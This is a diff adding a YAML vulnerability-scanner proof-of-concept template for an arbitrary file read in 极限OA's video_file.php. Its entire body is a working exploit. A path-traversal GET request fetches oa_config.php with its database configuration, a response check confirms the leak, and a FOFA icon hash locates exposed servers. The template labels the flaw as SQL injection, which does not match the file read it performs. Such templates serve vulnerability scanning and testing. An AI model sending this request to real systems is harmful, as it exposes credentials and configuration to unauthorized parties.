@@ -1,0 +1,15 @@
+id: poc-yaml-sohuu-video-file-php-anyfile-read
+info:
+  name: 极限OA video_file.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 极限OA
+  fofa: icon_hash="1967132225"
+requests:
+- method: GET
+  path: /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
+  expression: status_code == 200 && contains(body,"$ROOT_PATH") && contains(body,"$MYSQL_DB=")
+    && contains(headers,"filename=\"oa_config.php\"")
+variables: {}
+transport: http
